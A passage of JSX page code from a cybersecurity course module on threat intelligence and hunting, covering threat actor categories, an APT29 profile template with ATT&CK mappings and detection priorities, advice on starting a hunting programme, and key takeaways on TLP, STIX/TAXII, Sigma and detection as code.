                ['Cybercriminal (eCrime)', 'Financial gain — ransomware, fraud, credential theft', 'Medium-high — uses commodity tools', 'All sectors; healthcare, finance prioritised', 'FIN7, REvil, LockBit, Scattered Spider'],
                ['Hacktivist', 'Political/ideological disruption', 'Low-medium — DDoS, defacement', 'Government, media, corporations', 'Anonymous, KillNet, SiegedSec'],
                ['Insider Threat', 'Financial gain, revenge, ideology', 'Varies; high privileged access', 'Any organisation with sensitive data', 'Disgruntled employees, contractors'],
                ['Script Kiddie', 'Notoriety, opportunistic', 'Low — uses public exploit kits', 'Opportunistic — any vulnerable system', 'Unnamed opportunists'],
              ].map(([cat, mot, soph, tgt, ex], i) => (
                <tr key={i} style={{ background: i % 2 === 0 ? 'transparent' : `${C}08` }}>
                  {[cat, mot, soph, tgt, ex].map((c, j) => (
                    <td key={j} style={{ padding: '9px 14px', color: 'var(--text)', border: `1px solid ${C}22`, fontSize: 13 }}>{c}</td>
                  ))}
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        <H>Building an Actor Profile</H>
        <Block>{`Threat actor profile template:

Actor: APT29 (Cozy Bear / Midnight Blizzard)
Attribution: Russian Foreign Intelligence Service (SVR)
Since: ~2008
Primary motivation: Espionage — government, diplomatic, political intel

TARGET SECTORS:
  - Government (especially State Dept, embassies)
  - Healthcare (COVID-19 vaccine research)
  - Think tanks and NGOs
  - Technology sector (SolarWinds supply chain)

INITIAL ACCESS (commonly observed):
  - T1566.001 Spearphishing with weaponised documents
  - T1195.002 Supply chain compromise (SolarWinds SUNBURST)
  - T1078 Valid accounts (credential theft via phishing)

TOOLING:
  - SUNBURST (SolarWinds backdoor)
  - BEATDROP, BOOMMIC, BOOMDROP loaders
  - Cobalt Strike (post-compromise)
  - WellMess, WellMail (custom implants)
  - FOGGYWEB (AD FS credential theft)

NOTABLE CAMPAIGNS:
  - SolarWinds supply chain (2020) — ~18,000 orgs affected
  - COVID-19 vaccine research targeting (2020)
  - Democratic National Committee breach (2016)
  - Microsoft corporate email breach (2024)

DETECTION PRIORITIES:
  - Hunt for SUNBURST DGA domains in DNS logs
  - Monitor AD FS logs for FOGGYWEB indicators
  - Detect unusual OAuth app grants (consent phishing)
  - Alert on lateral movement with valid credentials + VPN

SOURCE: attack.mitre.org/groups/G0016, CISA AA21-116A`}
        </Block>

        <ProTip>Subscribe to your sector's ISAC threat intelligence digest. Financial sector analysts should read FS-ISAC; healthcare analysts should read H-ISAC. These provide vetted, sector-specific intelligence you cannot get from public sources, often 48-72 hours before public disclosure.</ProTip>

        <IQ
          q="How would you build a threat hunting programme from scratch at a company that has never done it?"
          a="Start with four building blocks. First, data: ensure you have the logs needed to hunt — Windows Event Logs (4688, 4104, 4624, 4648, 7045), Sysmon telemetry (events 1, 3, 7, 8, 10), network proxy logs, DNS query logs, and EDR telemetry. Without data, hunting is impossible. Second, intelligence: identify which threat actors are relevant to your industry and pull their ATT&CK technique profiles. Third, hypothesis: write one hypothesis per week based on actor profiles — 'I believe we may see Kerberoasting (T1558.003) because our AD has service accounts with weak passwords and SPNs.' Fourth, execute and document: run the hunt, document what you found and what data gaps exist, and turn findings into permanent detection rules. Track hunts in a log: hypothesis, date, result, detection rule created. This turns ad-hoc searching into a systematic programme that improves your detection coverage over time."
        />
      </Part>

      <HR />

      <KeyTakeaways items={[
        'Threat intelligence has four types — strategic (board-level trends), operational (campaign details), tactical (TTPs), and technical (IOCs) — each consumed by different audiences on different timelines.',
        'TLP (Traffic Light Protocol) controls how intelligence can be shared: RED=named recipients only, AMBER=org internal, GREEN=community, CLEAR=public.',
        'STIX provides the language (structured JSON objects: indicators, malware, actors, campaigns) and TAXII provides the transport protocol for machine-readable intelligence exchange.',
        'MITRE ATT&CK organises adversary behaviour into 14 tactics and hundreds of techniques; mapping your detections to ATT&CK reveals coverage gaps that become your detection engineering backlog.',
        'Threat hunting starts with a hypothesis grounded in intelligence: who is targeting you, what technique would they use, and what observable evidence would that leave in which log source?',
        'Beaconing detection (regular C2 check-ins) requires statistical analysis of connection timing — look for connections with low standard deviation in interval and consistent byte sizes.',
        'LOLBin (Living-off-the-Land Binary) abuse means attackers use certutil, mshta, regsvr32, and other legitimate Windows binaries — detect by command-line anomalies, not binary reputation.',
        'Sigma rules let you write detection logic once and convert it to any SIEM (Splunk, KQL, Elastic) — use it as the standard format for your detection rule library.',
        'Detection rules need false positive testing against 30-90 days of historical data before production deployment — high FP rates cause alert fatigue and make real threats invisible.',
        'Detection as Code: store detection rules in Git, validate in CI/CD, and auto-deploy to SIEM — this gives version control, review, and auditability to your detection engineering programme.',
      ]} />

      <Callout type="info">
        <strong>Up Next — Module 35: DevSecOps</strong><br />
        Module 35 brings security into the software development pipeline end-to-end. You will learn how to embed security gates at every SDLC phase, build secure CI/CD pipelines with SAST/DAST/SCA, implement infrastructure-as-code security scanning, manage secrets in pipelines, and foster a security culture where developers own security outcomes.
      </Callout>

    </LearnLayout>
  )
}
